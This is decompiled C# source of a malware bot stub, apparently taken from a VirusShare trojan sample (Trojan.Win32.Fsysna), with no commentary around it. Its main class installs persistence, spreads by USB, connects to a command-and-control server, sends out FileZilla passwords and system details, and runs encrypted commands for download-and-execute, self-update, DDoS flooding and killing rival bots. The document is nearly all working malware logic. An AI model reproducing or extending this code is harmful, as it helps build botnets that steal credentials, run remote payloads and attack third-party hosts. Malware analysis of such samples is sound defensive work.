// Decompiled with JetBrains decompiler
// Type: Stub.c_Main
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Stub
{
  internal class c_Main
  {
    private static TcpClient socketTcpClient;
    private static IPEndPoint connectionEndPoint = (IPEndPoint) null;
    public static Thread persistanceThread = new Thread(new ThreadStart(c_Startup.Persistance));
    public static Thread connectionThread = new Thread(new ThreadStart(c_Main.Connect));

    private static void Main()
    {
      Thread.Sleep(1000);
      c_Config.LoadConfigs();
      if (!new Mutex(false, c_Config.s_Mutex).WaitOne(0, true))
        Environment.Exit(0);
      c_Startup.b_Install();
      if (c_Config.i_Persistance == 1)
        c_Main.persistanceThread.Start();
      if (c_Config.i_Spread_USB == 1)
        c_Spreading.StartUSB();
      c_Main.connectionThread.Start();
      Process.GetCurrentProcess().WaitForExit();
    }

    private static void Connect()
    {
      try
      {
        c_Main.socketTcpClient = new TcpClient();
        if (c_Main.connectionEndPoint == null)
          c_Main.connectionEndPoint = new IPEndPoint(IPAddress.Parse(c_Network.GetIPByHost(c_Config.s_Host)), c_Config.i_Port);
        c_Main.socketTcpClient.Connect(c_Main.connectionEndPoint);
        c_Main.SendData("Hello|" + c_Config.s_ServerID + "|" + c_Misc.GetOS() + "|" + c_Config.s_Version + "|" + c_Config.s_Status + "|");
        c_Passwords.SendFileZilla();
        c_Main.socketTcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(c_Main.Read), (object) null);
      }
      catch
      {
        Thread.Sleep(c_Config.i_Interval);
        c_Main.socketTcpClient.Close();
        c_Main.Connect();
      }
    }

    private static void Read(IAsyncResult ar)
    {
      try
      {
        c_Main.Parse(new StreamReader((Stream) c_Main.socketTcpClient.GetStream()).ReadLine());
        c_Main.socketTcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(c_Main.Read), (object) null);
      }
      catch
      {
        Thread.Sleep(c_Config.i_Interval);
        c_Main.socketTcpClient.Close();
        c_Main.Connect();
      }
    }

    public static void SendData(string s_Data)
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter((Stream) c_Main.socketTcpClient.GetStream());
        s_Data = c_Security.Encrypt(s_Data, c_Config.s_Password, c_Config.s_Password, "MD5", 2, "@1B2c3D4e5F6g7H8", 256);
        streamWriter.WriteLine(s_Data);
        streamWriter.Flush();
      }
      catch
      {
        Thread.Sleep(c_Config.i_Interval);
        c_Main.socketTcpClient.Close();
        c_Main.Connect();
      }
    }

    private static void Parse(string s_Data)
    {
      s_Data = c_Security.Decrypt(s_Data, c_Config.s_Password, c_Config.s_Password, "MD5", 2, "@1B2c3D4e5F6g7H8", 256);
      string[] strArray = s_Data.Split('|');
      switch (strArray[0])
      {
        case "Download":
          c_Config.s_Status = !c_Network.b_DownloadFile(strArray[1], strArray[2], true) ? "Download & Execute failed!" : "Downloaded & Executed Successfully!";
          c_Main.SendData("Status|" + c_Config.s_Status);
          break;
        case "Update":
          if (c_Network.b_DownloadFile(strArray[1], strArray[2], true))
          {
            if (c_Startup.b_Uninstall())
              Environment.Exit(0);
            else
              c_Config.s_Status = "Updating failed!";
          }
          c_Main.SendData("Status|" + c_Config.s_Status);
          break;
        case "Uninstall":
          if (c_Startup.b_Uninstall())
            Environment.Exit(0);
          else
            c_Config.s_Status = "Uninstall failed!";
          c_Main.SendData("Status|" + c_Config.s_Status);
          break;
        case "DDoS":
          if (strArray[1] == "Start")
          {
            c_DDoS.s_Host = strArray[2];
            c_DDoS.i_Port = int.Parse(strArray[3]);
            c_DDoS.i_Interval = int.Parse(strArray[4]);
            c_DDoS.i_Threads = int.Parse(strArray[5]);
            c_DDoS.i_Sockets = int.Parse(strArray[6]);
            c_DDoS.i_PacketSize = int.Parse(strArray[7]);
            c_DDoS.i_DDoSType = int.Parse(strArray[8]);
            c_DDoS.s_URL = strArray[9];
            c_DDoS.Start();
            c_Config.s_Status = "Flooding: " + strArray[2];
            c_Main.SendData("Status|" + c_Config.s_Status);
            break;
          }
          if (!(strArray[1] == "Stop") || !c_DDoS.b_Flood)
            break;
          c_DDoS.Stop();
          c_Config.s_Status = "Idle...";
          c_Main.SendData("Status|" + c_Config.s_Status);
          break;
        case "Botkiller":
          new Thread(new ThreadStart(c_Botkiller.Clean)).Start();
          break;
      }
    }
  }
}
